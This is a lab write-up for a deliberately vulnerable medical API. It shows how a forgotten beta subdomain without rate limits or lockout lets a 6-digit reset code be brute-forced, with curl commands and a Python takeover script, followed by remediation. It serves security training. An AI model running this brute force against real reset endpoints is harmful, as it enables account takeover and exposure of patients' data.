---
id: API9:2023
title: "Improper Inventory Management — Forgotten Beta Subdomain Runs the Precarious OTP-Reset Mechanism (no rate-limit, no attempt cap)"
category: API
status: DONE
severity: High
owasp: "API9:2023 — Improper Inventory Management"
cwe: "CWE-307 (Improper Restriction of Excessive Authentication Attempts) / CWE-640 (Weak Password Recovery Mechanism) / CWE-799 (Improper Control of Interaction Frequency)"
source_docs:
  - "stages/01_spec/output/API9-inventory-spec.md"
  - "stages/01_spec/output/API9-dns-vhosts-delta.md"
  - "stages/01_spec/output/API9-appcap-delta.md"
affected_components:
  - cloud_api/careotter/proxy/nginx.vuln.conf
  - cloud_api/careotter/proxy/nginx.secure.conf
  - cloud_api/careotter/proxy/Dockerfile
  - cloud_api/careotter/proxy/entrypoint.sh
  - cloud_api/careotter/docker-compose.yml
  - cloud_api/careotter/cloudctl.sh
  - cloud_api/careotter/api_server/app.py
  - cloud_api/careotter/api_server/services/database_service.py
  - cloud_api/careotter/api_server/static/js/patient_login.js
verified_date: 2026-06-10
---

# API9 — Improper Inventory Management (Forgotten Beta Subdomain Runs the Precarious OTP Mechanism)

> **OWASP:** API9:2023 — Improper Inventory Management
> **CWE:** CWE-307 / CWE-640 / CWE-799
> **Severity:** High

> **Toggle.** `VULNERABLE` (passed to the proxy via `docker-compose.yml`) controls whether the **forgotten host is even up**. One edge (`careotter-proxy`) fronts the same `careotter-api` under two names. `api.careotter.lab` is the **secure** auth mechanism in both modes. `beta.api.careotter.lab` is the **precarious** one. **`VULNERABLE=1`** serves the beta host (no rate-limit, no attempt cap) so the OTP is brute-forceable by pivoting to it. **`VULNERABLE=0`** returns **404** for the beta host — it is decommissioned, which is the real API9 remediation, leaving only the secure host.

---

## Why It Matters

**Improper Inventory Management (API9:2023)** is about hosts, subdomains and API versions you forgot you were running. A control added to the *managed* name does nothing for a *forgotten* name that serves the same code. This is the canonical OWASP example — the password-reset throttle is enforced on the official host, but a forgotten `beta.` host runs the same reset flow without it — instantiated on a medical-monitoring backend.

CareOtter resets a patient password with a 6-digit one-time code. The official auth host (`api.careotter.lab`) protects that flow with **two** controls — an edge rate-limit and an application-level per-account attempt cap. The forgotten `beta.api.careotter.lab` host runs the **same** `careotter-api` with **neither**. An attacker who resolves the beta name brute-forces the 10^6 code space against an endpoint that processes every request and never locks, resets the password of any known account (the lab targets `john_doe`, already self-discoverable), and takes the account over. Account takeover here means a stranger reading a patient's vitals, devices, caregivers, and store wallet.

The lesson is sharp because the application *does* have a real fix on the official host, and a forgotten host simply skipped it. The remediation is not "add the controls to beta" — it is to **inventory and decommission** the forgotten host, which is exactly what secure mode does (it 404s the beta name).

---

## The two mechanisms (one edge, selected by a trusted proxy header)

```
                          ┌─ api.careotter.lab       — SECURE: edge limit_req + app attempt-cap (X-OTP-Guard: on)
client ── :80 / :5002 ────┤   (one nginx edge: careotter-proxy)                                                ├──► careotter-api
                          └─ beta.api.careotter.lab  — PRECARIOUS: no limit_req, guard cleared → app skips cap
                                                       (VULNERABLE=1 only; VULNERABLE=0 → 404, decommissioned)
```

- One edge container (`careotter-proxy`) listens on `:80` (clean no-port URLs) and `:5002` (legacy — the patient portal, the Android app and the Pi `cloud_set` use `:5002`). Two `server_name` vhosts forward to the same internal `careotter-api:5002`.
- **`api.careotter.lab` (secure mechanism)** — the edge applies `limit_req` on `/api/auth/password-reset/verify` **and** sets the trusted request header `X-OTP-Guard: on`, which tells the app to enforce the per-account attempt cap. It is also the `default_server`, so any other Host (`localhost:5002`, the app, the Pi) hits this protected host.
- **`beta.api.careotter.lab` (precarious mechanism)** — no `limit_req`, and the edge **clears** `X-OTP-Guard` (`""`), so the app neither counts nor checks the cap. Both brute-force protections are absent. Served only when `VULNERABLE=1`.
- `X-OTP-Guard` is a **trusted** header — nginx overwrites any client-supplied copy, so the app relies on it rather than the attacker-controlled `Host`.

> **Co-located, still "forgotten".** Running both vhosts on one edge is a lab convenience — the lesson is identical to a separate, un-inventoried box. The point of API9 is that a **name** nobody tracked serves the API without the controls the official name has. In the wild this is the same shape whether the forgotten host is a stale nginx vhost, an old load-balancer target, or a separate server.

> **Sibling distinction.** **API8** is a misconfiguration on the production vhost (an ACL bypass). **API2** is a rate-limit that exists in the app but is *mis-placed* (role gate before the limiter). **API9** is the controls being correctly built on the official name and *absent from a second name you forgot about*. Same backend, different forgotten door.

---

## The vulnerability

The secure host enforces two controls. The forgotten host has neither.

**1. App-level per-account attempt cap (secure mechanism).** `api_server/app.py` enforces a cap on `/verify` when the trusted `X-OTP-Guard: on` header is present. After `MAX_OTP_ATTEMPTS` (5) wrong codes the OTP is **locked** in the DB (`password_reset_otp.attempts`), and a locked OTP rejects every code — even the correct one — until a fresh code is requested. Because the state is per-account and persisted, a page reload or an IP change grants **no** new tries (this is the production-grade answer to "where is the attempt block stored").

```python
enforce_cap = (Config.VULNERABLE == 0) or (request.headers.get('X-OTP-Guard') == 'on')
...
if enforce_cap and record.get('attempts', 0) >= MAX_OTP_ATTEMPTS:
    return jsonify({'error': 'Too many attempts. Request a new code.', 'code': 'OTP_LOCKED'}), 403
if record.get('otp_code') == otp:
    ... reset password ...                       # success
if enforce_cap:
    attempts = db.increment_otp_attempts(username)   # SECURE: count toward the lock
    if attempts >= MAX_OTP_ATTEMPTS:
        return ... 'OTP_LOCKED', 403
return ... 'OTP_INVALID', 401                    # PRECARIOUS path never counts/checks
```

**2. Edge rate-limit (secure mechanism).** `proxy/nginx.vuln.conf`, the `api.careotter.lab` vhost: `limit_req zone=otp burst=2 nodelay;` on `/verify`, plus `proxy_set_header X-OTP-Guard on;`.

**The forgotten host has neither.** The `beta.api.careotter.lab` vhost omits `limit_req` and clears the guard:

```nginx
server {
    server_name beta.api.careotter.lab;          # served only in VULNERABLE=1
    location / {
        proxy_pass http://careotter-api:5002;
        proxy_set_header X-OTP-Guard "";          # cleared → app skips the attempt cap
        # … no limit_req anywhere → no edge throttle …
    }
}
```

So on beta the app processes every guess, never throttles, never locks. Crucially, a prior lock driven from `api.` does **not** block beta — the precarious path never reads `attempts`, and the lock does not set `used`. The 10^6 space is exhaustible inside the OTP's 24h vuln-mode TTL.

### Secure mode (`VULNERABLE=0`) — the forgotten host is decommissioned

`proxy/nginx.secure.conf` serves only the hardened `api.careotter.lab` (edge limit + app cap) and returns **404** for `beta.api.careotter.lab` (an explicit 404 block, not omission, so a `Host: beta` request cannot fall through to the default host and reach a no-cap path). There is no precarious path to pivot to.

---

## Exploit — pivot the OTP request to the forgotten beta subdomain

**Precondition:** `VULNERABLE=1`. the stack is up (`./cloudctl.sh start`). Both names resolve to the host — add the line `cloudctl` prints to `/etc/hosts`, or use `--resolve <name>:80:127.0.0.1`. Target is `john_doe`. Attacker has **no account**.

The portal's reset flow posts to the external auth API `http://api.careotter.lab/...` (you see `Host: api.careotter.lab` in the proxy). The attacker captures it and **changes the host to `beta.api.careotter.lab`**, the forgotten one without the controls.

![[api9_subdomain_discovery.png]]

![[api9_beta_subdomain_discovered.png]]

![[api9_brute_force_attack.png]]

![[api9_password_changed.png]]

```bash
# Prereq DNS (once):  /etc/hosts →  127.0.0.1  api.careotter.lab beta.api.careotter.lab

# 1) Trigger a reset code for the victim (generic response; code is logged server-side).
curl -s -X POST http://beta.api.careotter.lab/api/auth/password-reset/request \
     -H 'Content-Type: application/json' -d '{"username":"john_doe"}'

# 2) The OFFICIAL host has BOTH controls — useless for brute force:
#    edge limit_req 429s in ~3 requests, and the app locks the OTP after 5 wrong codes.
for i in $(seq 1 10); do
  curl -s -o /dev/null -w '%{http_code} ' -X POST http://api.careotter.lab/api/auth/password-reset/verify \
       -H 'Content-Type: application/json' -d '{"username":"john_doe","otp":"000000","new_password":"x"}'
done; echo            # → 401s then 429 (edge); the app would also lock at attempt 5

# 3) The forgotten beta host has NEITHER — brute-force the 6-digit code there.
```

```python
# brute_otp.py — exhaust the 6-digit space against the un-throttled, un-capped beta host
import requests
BETA = "http://beta.api.careotter.lab/api/auth/password-reset/verify"
for n in range(1_000_000):
    r = requests.post(BETA, json={"username": "john_doe",
                                  "otp": f"{n:06d}", "new_password": "Pwned2026!"})
    if r.status_code == 200:
        print("HIT", f"{n:06d}", "→ password is now Pwned2026!")
        break
    # no 429, no OTP_LOCKED ever — every request is processed
```

```bash
# 4) Account takeover: log in as the victim with the password we just set.
curl -s -X POST http://api.careotter.lab/api/auth/login/patient \
     -H 'Content-Type: application/json' \
     -d '{"username":"john_doe","password":"Pwned2026!"}'      # → 200 + JWT
```

### Happy-path (operator verification, since there is no real inbox)

```bash
./cloudctl.sh logs careotter-api | grep password-reset
#    [password-reset] OTP for john_doe: 481930
curl -s -X POST http://api.careotter.lab/api/auth/password-reset/verify \
     -H 'Content-Type: application/json' \
     -d '{"username":"john_doe","otp":"481930","new_password":"NewPass2026!"}'   # → 200 (within 5 tries)
```

### Discovery (how the attacker finds the beta name)

- **Subdomain enumeration / DNS.** The official API is `api.careotter.lab`. A guess at `beta.`, `staging.`, `dev.` (or DNS brute-force / certificate-transparency mining) surfaces `beta.api.careotter.lab`, which resolves to the same edge but runs the precarious mechanism.
- **Same responses, missing controls.** `beta.api` returns identical bodies to `api.` for normal routes, but `/verify` never yields `429` or `OTP_LOCKED` — the missing throttle and missing lockout are the tell.

---

## Expected Result

- **`VULNERABLE=1`:** brute-forcing `/verify` on **`beta.api.careotter.lab`** never returns `429` or `OTP_LOCKED` — every guess is processed and the correct code returns `200` (takeover). On **`api.careotter.lab`** the edge `429`s after the burst, and the app locks the OTP (`403 OTP_LOCKED`) after 5 wrong codes — a prior api.-driven lock does **not** block beta. `localhost:5002` (default host) behaves as `api.` (secure).
- **`VULNERABLE=0`:** **`beta.api.careotter.lab`** returns `404` on every path (decommissioned), so there is no precarious path. `api.careotter.lab` serves (edge limit + app cap).
- **Reload-proof lockout:** on `api.`, after 5 wrong codes the OTP is locked in the DB. A page reload, a fresh connection, or an IP change does **not** grant more tries — only requesting a new code (which the attacker does not have) resets the counter.
- **Completability (must hold):** achievable_rate × TTL ≥ 10^6. Measured ~47 req/s sequential on beta (a threaded attacker is far faster) over the 24h vuln-mode TTL = ~4M, covering the space.

---

> **Lab caveat — the reset overwrites `john_doe`.** A successful takeover sets a new password for `john_doe`, which **invalidates the leaked `johnny123`** shown in the portal's "Forgot password?" hint (and the `SEED_PASS` constant in `static/js/patient_login.js`), and can disturb the API1/API3 chains tied to that account. `/initialize_iot` will **not** restore it (it returns `409` once users exist). To get `john_doe` / `johnny123` back, do a clean lab reset: `./cloudctl.sh reset` (drops the `careotter_data` volume) then start again, or re-seed on a fresh DB. The exploit itself deletes nothing — it only changes one password.

> **DNS caveat — the legit browser reset now requires `/etc/hosts`.** The portal posts the OTP to the absolute external auth API `http://api.careotter.lab/...`, so the browser must resolve that name. Add the `/etc/hosts` line (`cloudctl` prints it) before using "Forgot password?" in a browser. The brute-force tool ignores DNS-in-browser and CORS, so the attack on beta is unaffected.

---

## How It Should Be

- **Inventory and decommission** — the secure mode demonstrates the fix. A non-production name must not serve the production reset flow. Track every host, subdomain and version, and retire the forgotten one (secure mode returns `404` for the beta name).
- **Put the controls where they cannot be skipped** — the per-account attempt cap lives in the **app** (it is the same code on every name), so a forgotten edge cannot drop it. The lab models the precarious host by clearing a trusted header, which stands in for "the old deployment that predates the cap".
- **Harden the recovery mechanism (CWE-640)** — a 6-digit numeric code with a 24h life is weak. Pair the per-account cap (implemented) with a long random token, a short TTL (minutes), single-use, and constant-time comparison.
- **Keep the response generic and the failure uniform** (already done) — the missing controls are the throttle and the lockout, not the wording.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Inventory | Asset/subdomain/version inventory, decommission the forgotten host (secure mode 404s it) | Remove the un-managed surface (API9 root cause) |
| AuthN | Per-account attempt cap + lockout **in the app** (implemented on the secure host) | Make the control un-skippable by any edge (CWE-307) |
| Recovery | Long random token, short TTL (minutes), single-use, constant-time compare | Strengthen the recovery mechanism (CWE-640) |
| Edge | Apply the rate-limit uniformly to every host via shared config | Defense-in-depth, not the sole control (CWE-799) |

---

## Verification Checklist

- [ ] **App cap (bypass the edge to see it)**: hit `careotter-api` directly with `X-OTP-Guard: on` — 6 wrong codes → `401 401 401 401 403 403` (locked at 5). The correct code is then also `403 OTP_LOCKED`. A fresh connection stays `403` (DB-persistent — reload does not revive).
- [ ] **Precarious beta (no guard)**: many wrong codes → all `401` (no lock, no rate-limit), and the correct code → `200` even after an api.-driven lock → takeover. The secure-side lock does not protect the forgotten host.
- [ ] **`VULNERABLE=1` edge gap by name**: `/verify` flood on `beta.api.careotter.lab` → no `429`. On `api.careotter.lab` → `429` after burst. `localhost:5002` (default) → `429`.
- [ ] **`VULNERABLE=0`**: `beta.api.careotter.lab` → `404` on every path (decommissioned). `api.careotter.lab` serves (limited + capped).
- [ ] **CORS**: `Access-Control-Allow-Origin: *` present on `/api/auth/password-reset/*` responses (the browser reset posts cross-origin to `api.careotter.lab`).
- [ ] **API8 regression** (configs touched): vuln `api /api/db/info`=403, `…/`=200. Secure `api` both 403, `beta` 404.
- [ ] **Caveat**: after a takeover, `john_doe`/`johnny123` no longer logs in. `./cloudctl.sh reset` + start restores it.

---

## Out of scope (other API9 candidates, not this vuln)

- Old API **versions** (`/v1` vs `/v2`) left enabled — this lab models a forgotten **subdomain/host**, not a versioned path.
- Undocumented endpoints discoverable from stale OpenAPI/Swagger.
- The verbose `/api/health` data exposure (baseline info, not promoted here).
- Re-pointing the beta vhost at a *different* (stale) `careotter-api` build — the lab deliberately shares one backend so the contrast is purely the missing controls.

---

## References

- Spec: `stages/01_spec/output/API9-inventory-spec.md` + `API9-dns-vhosts-delta.md` (DNS subdomains) + `API9-appcap-delta.md` (app cap + two-mechanism toggle + auth-API targeting)
- `cloud_api/careotter/proxy/nginx.vuln.conf` / `nginx.secure.conf` — the two mechanisms (`X-OTP-Guard` + `limit_req` on api., neither on beta., beta `404` in secure), `entrypoint.sh`, `Dockerfile`
- `cloud_api/careotter/docker-compose.yml` (single `careotter-proxy` on `:80` + `:5002`, `VULNERABLE` toggle), `cloudctl.sh` (prints the `/etc/hosts` line + host URLs)
- `cloud_api/careotter/api_server/app.py` (`/verify` two-mechanism lockout via `X-OTP-Guard`, `MAX_OTP_ATTEMPTS`, CORS), `services/database_service.py` (`password_reset_otp.attempts` + `increment_otp_attempts`)
- `cloud_api/careotter/api_server/static/js/patient_login.js` (OTP flow posts to the absolute external auth API + handles `OTP_LOCKED`)
- Related: `API8_Security_Misconfiguration.md` — same edge, different failure (ACL bypass on the production vhost). Related: `API2_Broken_Authentication.md` — a mis-placed app limiter vs API9's correctly-built controls absent from a forgotten name.
